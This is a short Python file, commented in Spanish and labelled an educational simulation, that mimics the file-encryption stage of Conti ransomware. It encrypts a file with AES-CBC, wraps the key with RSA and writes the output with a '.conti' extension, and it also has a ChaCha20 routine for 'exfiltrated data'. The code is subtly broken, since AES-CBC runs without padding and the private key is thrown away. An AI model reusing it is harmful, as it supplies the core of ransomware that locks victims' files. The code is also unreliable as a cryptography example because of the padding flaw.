# ADVERTENCIA: Este es un archivo simulado educativo. No ejecutar en sistemas reales.
# Simula el cifrado híbrido RSA+AES y ChaCha para datos exfiltrados.

import os
import json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes

def load_config():
    with open('config.json', 'r') as f:
        return json.load(f)

def generate_keys():
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()
    return private_key, public_key

def encrypt_file(file_path, aes_key, rsa_public_key):
    with open(file_path, 'rb') as f:
        data = f.read()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    encrypted = encryptor.update(data) + encryptor.finalize()
    # Encriptar clave AES con RSA
    encrypted_key = rsa_public_key.encrypt(
        aes_key,
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
    )
    with open(file_path + '.conti', 'wb') as f:
        f.write(iv + encrypted + encrypted_key)

def encrypt_data(data, chacha_key):
    # Simular ChaCha para exfiltración
    nonce = os.urandom(16)
    cipher = Cipher(algorithms.ChaCha20(chacha_key, nonce), mode=None)
    encryptor = cipher.encryptor()
    encrypted = encryptor.update(data) + encryptor.finalize()
    return nonce + encrypted

if __name__ == "__main__":
    config = load_config()
    private_key, public_key = generate_keys()
    aes_key = os.urandom(32)
    # encrypt_file("example.txt", aes_key, public_key)